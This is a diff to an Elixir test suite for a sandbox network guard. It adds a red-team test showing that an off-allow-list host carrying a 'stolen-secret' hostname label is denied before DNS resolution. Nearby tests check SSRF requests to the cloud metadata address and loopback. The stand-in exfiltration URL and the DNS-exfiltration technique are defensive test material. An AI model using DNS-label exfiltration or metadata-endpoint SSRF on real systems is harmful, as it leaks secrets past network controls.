@@ -165,6 +165,21 @@ defmodule Workbooks.NetGuardTest do
     assert {:error, :denied} = NetGuard.get("http://169.254.169.254/")
   end
 
+  test "RED-TEAM DNS-exfil — an off-allow-list host is denied WITHOUT a DNS lookup (no label leak)" do
+    Workbooks.BrokerAudit.reset()
+    # A guest encodes data in a hostname label on a domain it controls, hoping the host RESOLVES it (leaking the
+    # label to the attacker's nameserver) before the HTTP deny. The allow-list check is SYNTACTIC and runs
+    # FIRST, so an off-list host is denied with NO resolution. Proof: the deny reason is :allowlist (pre-DNS) —
+    # if the resolving SSRF check ran first, this non-resolvable host would deny as :ssrf instead.
+    bogus = "http://stolen-secret-#{System.unique_integer([:positive])}.nonexistent-xyzzy-tld./"
+    assert {:error, :denied} = NetGuard.get(bogus, allow: ["example.com"])
+    assert {:error, :denied} = NetGuard.request(:get, bogus, allow: ["example.com"])
+
+    assert Workbooks.BrokerAudit.count({:net, :deny, :allowlist}) >= 2
+    # crucial: the SSRF/resolve path was NEVER entered for the off-list host (zero DNS queries)
+    assert Workbooks.BrokerAudit.count({:net, :deny, :ssrf}) == 0
+  end
+
   test "request/3 — full-method brokered client keeps SSRF on EVERY method (hermetic)" do
     # POST/PUT/DELETE to internal targets must be SSRF-denied just like GET — before any socket opens.
     assert {:error, :denied} = NetGuard.request(:post, "http://127.0.0.1/", body: "x")
